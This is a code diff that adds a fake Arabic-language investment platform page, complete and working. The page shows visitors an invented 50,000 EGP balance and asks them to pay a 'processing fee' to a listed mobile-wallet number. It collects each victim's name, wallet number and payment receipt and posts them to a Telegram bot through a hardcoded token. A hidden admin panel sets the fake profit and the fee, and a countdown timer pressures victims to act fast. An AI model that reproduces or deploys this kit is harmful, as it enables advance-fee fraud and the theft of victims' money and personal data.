@@ -44,4 +44,125 @@
 
 <div class="login-card" id="login-page">
     <h1>🏮 شركة التقوى للاستثمار 🌙</h1>
+    <p style="font-size: 14px; color: #ccc;">برجاء إدخال كود الدخول للمنصة</p>
+    <input type="password" id="entryPass" placeholder="كود الوصول">
+    <button onclick="accessSite()">دخول</button>
+</div>
 
+<div id="admin-panel">
+    <div class="admin-content">
+        <h3 style="color:var(--gold); margin:0; text-align:center;">لوحة إدارة المنصة</h3>
+        <label>كود الدخول (Password):</label>
+        <input type="text" id="setPass" value="123456">
+        <label>مدة صلاحية الرابط (بالدقائق):</label>
+        <input type="number" id="setTime" value="5">
+        <label>مبلغ الربح المعروض:</label>
+        <input type="number" id="setProfit" value="50000">
+        <label>رسوم التفعيل:</label>
+        <input type="number" id="setFees" value="500">
+        <button onclick="saveAdminSettings()">حفظ وإغلاق</button>
+    </div>
+</div>
+
+<div id="main-site">
+    <div class="site-card">
+        <div class="timer-badge">⏱️ الجلسة تنتهي خلال: <span id="displayTime">05:00</span></div>
+        <h2 style="color:var(--gold); margin:0;">لوحة الأرباح</h2>
+        <div class="balance-box">
+            <span style="font-size:12px; color:#aaa;">رصيدك الحالي</span>
+            <div><span id="showProfit">50,000</span> <small>EGP</small></div>
+        </div>
+        <input type="text" id="uName" placeholder="الاسم بالكامل">
+        <input type="tel" id="uWallet" placeholder="رقم المحفظة (فودافون كاش..)">
+        <p style="font-size:12px;">رسوم المعالجة المطلوبة (<span id="showFees" style="color:var(--gold); font-weight:bold;">500</span> ج.م) للرقم:</p>
+        <div style="background:#000; color:var(--gold); padding:10px; border-radius:10px; font-weight:bold; margin-bottom:15px;">01226811784</div>
+        <label style="display:block; text-align:right; font-size:12px; color:var(--gold);">ارفق صورة إيصال التحويل:</label>
+        <input type="file" id="uFile" accept="image/*">
+        <button class="submit-btn" onclick="sendToTelegram()">تأكيد السحب الآن</button>
+    </div>
+</div>
+
+<div id="loader"><div style="width:50px; height:50px; border:4px solid #333; border-top:4px solid var(--success); border-radius:50%; animation:spin 1s linear infinite;"></div><p>جاري المعالجة...</p></div>
+
+<script>
+    const TOKEN = '8398403697:AAEf0JjyVG-yE-DLS1FZKDX1_UKg8lEm02E';
+    const ID = '8232581666';
+
+    // استعادة الإعدادات من الذاكرة
+    let config = JSON.parse(localStorage.getItem('adminConfig')) || { pass: '123456', time: 5, profit: 50000, fees: 500 };
+
+    // تحديث الواجهة بالقيم المخزنة
+    function applyConfig() {
+        document.getElementById('showProfit').innerText = Number(config.profit).toLocaleString();
+        document.getElementById('showFees').innerText = config.fees;
+    }
+    applyConfig();
+
+    // فتح لوحة المدير (3 ضغطات في أسفل يمين الشاشة)
+    let count = 0;
+    function adminClick() { count++; if(count >= 3) { document.getElementById('admin-panel').style.display='flex'; count=0; } }
+
+    function saveAdminSettings() {
+        config = {
+            pass: document.getElementById('setPass').value,
+            time: document.getElementById('setTime').value,
+            profit: document.getElementById('setProfit').value,
+            fees: document.getElementById('setFees').value
+        };
+        localStorage.setItem('adminConfig', JSON.stringify(config));
+        applyConfig();
+        document.getElementById('admin-panel').style.display='none';
+        alert("تم الحفظ.");
+    }
+
+    async function accessSite() {
+        const pass = document.getElementById('entryPass').value;
+        if(pass === config.pass) {
+            document.getElementById('login-page').style.display = 'none';
+            document.getElementById('main-site').style.display = 'block';
+            
+            // إشعار دخول للبوت
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=🔔 دخول جديد للموقع باستخدام الكود.`);
+            
+            startCountdown(config.time * 60);
+        } else {
+            alert("كود خاطئ!");
+        }
+    }
+
+    function startCountdown(sec) {
+        let t = sec;
+        const display = document.getElementById('displayTime');
+        const timer = setInterval(() => {
+            let m = Math.floor(t / 60);
+            let s = t % 60;
+            display.innerText = (m<10?'0'+m:m) + ":" + (s<10?'0'+s:s);
+            if(--t < 0) { clearInterval(timer); alert("انتهى الوقت!"); location.reload(); }
+        }, 1000);
+    }
+
+    async function sendToTelegram() {
+        const name = document.getElementById('uName').value;
+        const wallet = document.getElementById('uWallet').value;
+        const file = document.getElementById('uFile').files[0];
+
+        if(!name || !wallet || !file) { alert("أكمل البيانات!"); return; }
+
+        document.getElementById('loader').style.display='flex';
+        const fd = new FormData();
+        fd.append('chat_id', ID);
+        fd.append('photo', file);
+        fd.append('caption', `🌟 طلب سحب 🌟\n👤 الاسم: ${name}\n📱 الرقم: ${wallet}\n💰 الربح: ${config.profit}\n💸 الرسوم: ${config.fees}`);
+
+        try {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            document.getElementById('loader').style.display='none';
+            alert("تم الإرسال!");
+            location.reload();
+        } catch(e) { document.getElementById('loader').style.display='none'; alert("خطأ في النت."); }
+    }
+</script>
+
+<style> @keyframes spin { to { transform: rotate(360deg); } } </style>
+</body>
+</html>
